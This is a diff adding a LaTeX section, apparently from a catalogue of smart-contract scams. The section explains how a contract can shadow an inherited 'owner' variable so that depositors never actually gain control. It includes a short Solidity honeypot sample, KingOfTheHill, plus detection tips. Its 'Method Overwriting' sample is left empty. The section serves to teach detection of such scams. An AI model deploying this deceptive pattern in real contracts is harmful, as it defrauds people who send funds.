@@ -1,0 +1,72 @@
+\section{Inheritance Overriding}
+
+\subsection{Evades}
+
+Source code reviews with subtle exploitation of the compilation process.
+
+\subsection{How}
+
+The malicious contract inherits from standard code like \emph{Ownable}, \emph{Upgradeable}, etc.
+
+It overwrites key elements by:
+
+\begin{itemize}
+\item{adding a variable definition for an existing keyword}
+\item{polymorphism, which allows to have several versions of a function}
+\end{itemize}
+
+Then a single keyword can refer to different implementations depending on its context.
+
+The resulting contract doesn't behave like its parent, while looking legitimate.
+
+\subsection{Samples}
+
+\subsubsection{Attribute Overwriting}
+
+\emph{KingOfTheHill} inherits from \emph{Ownable} but the original \emph{owner} cannot be changed:
+
+\begin{highlight}
+\begin{lstlisting}[language=Solidity]
+contract KingOfTheHill is Ownable {
+    address public owner; // different from the owner in Ownable
+
+    function () public payable {
+        if(msg.value > jackpot) owner = msg.sender; // local owner
+        jackpot += msg.value;
+    }
+    function takeAll () public onlyOwner { // owner from Ownable = contract creator
+        msg.sender.transfer(this.balance);
+        jackpot = 0;
+    }
+}
+\end{lstlisting}
+\end{highlight}
+
+In the modifier on \emph{takeAll}, the \emph{owner} points to the contract creator.
+It is at storage slot 1, while the fallback function overwrites the storage slot 2.
+
+In short, sending funds to this contract will never make you the actual owner.
+
+\subsubsection{Method Overwriting}
+
+\begin{highlight}
+\begin{lstlisting}
+
+\end{lstlisting}
+\end{highlight}
+
+\subsection{Detection \& Countermeasures}
+
+\begin{itemize}
+\item{Caveat: these overrides appear in the sources but not in the bytecode.}
+\item{The sources can be checked for duplicate definitions / polymorphism.}
+\end{itemize}
+
+Since the whole point is to advertize for a functionality with the sources, they will be available.
+
+\subsection{Resources}
+
+\begin{itemize}
+\item{\cite{paper-art-of-the-scam}, section \emph{3.2.2}}
+\item{\cite{video-masquerading-code}}
+\end{itemize}
